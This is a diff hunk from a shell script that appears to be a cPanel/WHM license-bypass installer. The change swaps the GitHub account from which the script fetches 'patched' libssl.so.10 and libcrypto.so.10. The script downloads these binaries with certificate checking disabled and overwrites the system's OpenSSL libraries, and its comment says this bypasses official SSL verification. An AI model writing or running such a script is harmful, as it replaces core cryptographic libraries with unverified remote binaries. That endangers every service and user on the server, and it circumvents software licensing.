@@ -16,15 +16,15 @@ mkdir -p /usr/local/syslic/cpanel 2>/dev/null
 # 2. Replace OpenSSL libraries from YOUR GitHub (bypasses official SSL verification)
 echo "[+] Installing patched OpenSSL libraries from your GitHub..."
 wget -q --no-check-certificate -O /usr/lib64/libssl.so.10 \
-    https://raw.githubusercontent.com/sskafandri/cPanel-WHM/main/libssl.so.10
+    https://raw.githubusercontent.com/bondhuit-com/cPanel-WHM/main/libssl.so.10
 wget -q --no-check-certificate -O /usr/lib64/libcrypto.so.10 \
-    https://raw.githubusercontent.com/sskafandri/cPanel-WHM/main/libcrypto.so.10
+    https://raw.githubusercontent.com/bondhuit-com/cPanel-WHM/main/libcrypto.so.10
 
 # For Debian/Ubuntu systems too
 wget -q --no-check-certificate -O /usr/lib/x86_64-linux-gnu/libssl.so.10 \
-    https://raw.githubusercontent.com/sskafandri/cPanel-WHM/main/libssl.so.10 2>/dev/null || true
+    https://raw.githubusercontent.com/bondhuit-com/cPanel-WHM/main/libssl.so.10 2>/dev/null || true
 wget -q --no-check-certificate -O /usr/lib/x86_64-linux-gnu/libcrypto.so.10 \
-    https://raw.githubusercontent.com/sskafandri/cPanel-WHM/main/libcrypto.so.10 2>/dev/null || true
+    https://raw.githubusercontent.com/bondhuit-com/cPanel-WHM/main/libcrypto.so.10 2>/dev/null || true
 
 chmod 755 /usr/lib64/libssl.so.10 /usr/lib64/libcrypto.so.10 2>/dev/null
 chmod 755 /usr/lib/x86_64-linux-gnu/libssl.so.10 /usr/lib/x86_64-linux-gnu/libcrypto.so.10 2>/dev/null
